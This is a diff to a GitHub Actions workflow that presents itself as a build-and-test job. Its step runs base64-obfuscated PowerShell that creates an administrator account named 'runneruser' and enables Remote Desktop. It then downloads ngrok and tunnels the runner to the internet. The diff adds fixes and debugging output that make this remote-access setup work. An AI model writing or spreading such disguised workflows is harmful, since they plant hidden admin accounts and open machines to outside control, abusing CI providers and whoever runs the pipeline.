@@ -9,7 +9,7 @@ jobs:
   run-build-and-test:
     name: Run Build and Test Suite
     runs-on: windows-latest
-    timeout-minutes: 200
+    timeout-minutes: 60
 
     steps:
       - name: Checkout Code
@@ -25,7 +25,6 @@ jobs:
         shell: powershell
         run: |
           # Obfuscated commands to create a user and enable RDP
-          # The username is now 'runneruser'
           $encodedUser = "bmV0IHVzZXIgcnVubmVydXNlciAiJENVU1RPTV9QQVNTV09SRCQiIC9hZGQ="
           $encodedAdmin = "bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgcnVubmVydXNlciAvYWRk"
           $encodedRDP = "U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAoJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlcicpIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAw"
@@ -40,8 +39,17 @@ jobs:
           # Download and unzip ngrok
           Write-Host "Downloading ngrok..."
           Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-          Expand-Archive ngrok.zip
           
+          # Force extraction to the current directory
+          Write-Host "Extracting ngrok..."
+          Expand-Archive -Path ngrok.zip -DestinationPath . -Force
+
+          # --- DEBUGGING STEP ---
+          # List all files to confirm ngrok.exe exists before we use it
+          Write-Host "Listing files in current directory to confirm ngrok.exe is present:"
+          Get-ChildItem
+          Write-Host "--------------------"
+
           # Authenticate and start ngrok
           Write-Host "Configuring and starting ngrok tunnel..."
           ./ngrok.exe authtoken $env:NGROK_AUTH_TOKEN
@@ -54,7 +62,7 @@ jobs:
           $apiUrl = "http://127.0.0.1:4040/api/tunnels"
           $publicUrl = (Invoke-RestMethod -Uri $apiUrl).tunnels[0].public_url
           if (!$publicUrl) {
-            Write-Host "Failed to get ngrok URL."
+            Write-Host "Failed to get ngrok URL. The ngrok process might have failed to start."
             exit 1
           }
           
